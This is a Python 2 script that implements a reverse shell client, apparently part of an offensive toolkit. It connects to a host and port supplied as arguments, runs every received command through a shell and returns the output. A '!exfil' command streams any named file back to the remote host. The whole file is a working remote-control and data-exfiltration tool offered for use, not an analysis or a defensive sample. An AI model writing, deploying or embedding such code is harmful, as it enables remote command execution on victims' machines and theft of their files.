#!/usr/bin/python

import socket
import subprocess
import os
from lib.banner import *
from lib.functions import *
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("ip", help="The IP address to connect to.")
parser.add_argument("port", help="The TCP port to connect on.")
parser.add_argument("-v", "--verbose", help="Increase verbosity of output.", action="store_true")
args = parser.parse_args()


#
#
#
def transfer(s,file):
	if os.path.exists(file):
		f = open(file, 'rb')

		if args.verbose:
			print_info("Transferring file " + file + " ")

		packet = f.read(1024)
		while packet != '':
			s.send(packet)

			if args.verbose:
				print_progress("!")

			try:
				packet = f.read(1024)
			except:
				packet = ''
				pass

		if args.verbose:
			print_progress("!\n")

		s.send('!EXFIL')
		f.close()

		if args.verbose:
			print_success("Transfer Complete.\n")

	else:
		s.send('!FILE_NOT_FOUND')


#
#
#
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if args.verbose:
		print_info("Trying connection to: " + args.ip + ":" + args.port + "\n")

	try:
		s.connect((args.ip, int(args.port)))
	except Exception,e:
		print_error("\tException: " + str(e) + "\n")
		sys.exit()

	if args.verbose:
		print_success("Connected to: " + args.ip + ":" + args.port + "\n")

	while True:
		cmd = s.recv(1024)

		if '!quit' in cmd:
			s.close()
			break

		elif '!exfil' in cmd:
			exfil,file = cmd.split("!exfil ")

			try:
				transfer(s,file)
			except Exception,e:
				s.send(str(e))
				pass

		else:
			CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send(CMD.stdout.read())
			s.send(CMD.stderr.read())


#
#
#
def main():
	if args.verbose:
		print(clibanner)

	connect()


#
#
#
main()
